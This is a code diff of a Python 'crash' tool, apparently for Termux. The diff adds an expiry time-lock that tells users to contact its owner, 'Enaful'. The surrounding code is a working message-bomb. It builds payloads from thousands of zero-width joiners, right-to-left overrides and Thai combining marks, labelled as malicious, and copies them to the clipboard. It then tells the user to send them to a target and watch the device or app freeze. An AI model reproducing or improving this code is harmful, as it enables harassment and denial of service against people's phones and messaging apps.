@@ -1,8 +1,24 @@
 import os
 import time
 import sys
+from datetime import datetime, timedelta
 
-# ক্লিপবোর্ডে অটো-কপি ফাংশন (Zero-Delay)
+# --- TIME LOCK SYSTEM (Expires in 10 Days) ---
+# টুলটি তৈরি করার তারিখ এবং ১০ দিন পরের তারিখ সেট করা হয়েছে
+EXPIRY_DATE = datetime(2026, 5, 22) # আপনি চাইলে এখানে তারিখ পরিবর্তন করতে পারেন
+
+def check_expiry():
+    current_date = datetime.now()
+    if current_date > EXPIRY_DATE:
+        os.system('clear')
+        print("\033[1;31m")
+        print("###############################################")
+        print("#          TOOL EXPIRED / টুলটি শেষ          #")
+        print("#      CONTACT OWNER: ENAFUL FOR UPDATE       #")
+        print("###############################################")
+        sys.exit()
+
+# ক্লিপবোর্ডে অটো-কপি ফাংশন
 def copy_to_clipboard(text):
     try:
         if os.path.exists('/data/data/com.termux/files/usr/bin/termux-clipboard-set'):
@@ -16,7 +32,6 @@ def copy_to_clipboard(text):
     return False
 
 # --- PURE MALICIOUS UNICODE DATABASE (V10.0 GLOBAL) ---
-# কোনো ফালতু টেক্সট নেই - শুধু পিওর ক্রাশ ক্যারেক্টার
 Z_W_J = "\u200D" * 2500     # Zero Width Joiner
 RTL = "\u202E" * 1200       # Right-to-Left Chaos
 THAI = "\u0E31" * 1000      # Thai Stresser
@@ -57,6 +72,9 @@ def banner():
     \033[1;32m""")
 
 def start_engine(key):
+    # প্রতিবার ইঞ্জিন স্টার্ট হওয়ার আগে এক্সপায়ারি চেক করবে
+    check_expiry()
+    
     payload = crash_db.get(key)
     print(f"\033[1;31m[*] LOADING WEAPON: {key}")
     time.sleep(1)
@@ -69,6 +87,8 @@ def start_engine(key):
     print("\n\033[1;37m" + payload[:60] + ".... [ENAFUL-V10-STABLE]")
     print("\n\033[1;33m[!] MISSION: SEND TO TARGET AND WATCH THE FREEZE.")
 
+# মেইন লজিক
+check_expiry() # শুরুতে একবার চেক করবে
 banner()
 print("\033[1;34mSELECT ATTACK VECTOR:")
 print("1. Asia Strike (Telugu/Hindi)")
@@ -92,4 +112,3 @@ if choice in mapping:
 else:
     print("\033[1;31m[!] WRONG CHOICE, BOSS!")
     sys.exit()
-
